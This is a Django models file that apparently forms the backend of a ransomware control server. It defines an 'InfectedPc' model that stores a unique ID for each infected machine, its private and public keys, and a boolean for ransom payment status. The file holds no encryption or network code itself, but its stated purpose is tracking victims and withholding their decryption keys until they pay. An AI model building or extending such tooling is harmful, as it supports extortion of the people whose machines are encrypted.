from django.db import models

# Create your models here.
class InfectedPc(models.Model):
    # An unique ID that identifies every infected PC
    uniqueId = models.CharField(max_length=255, null=False)
    privateKey = models.CharField(max_length=2048)
    publicKey = models.CharField(max_length=2048)
    #ransom payment status
    paymentStatus = models.BooleanField(default=False)
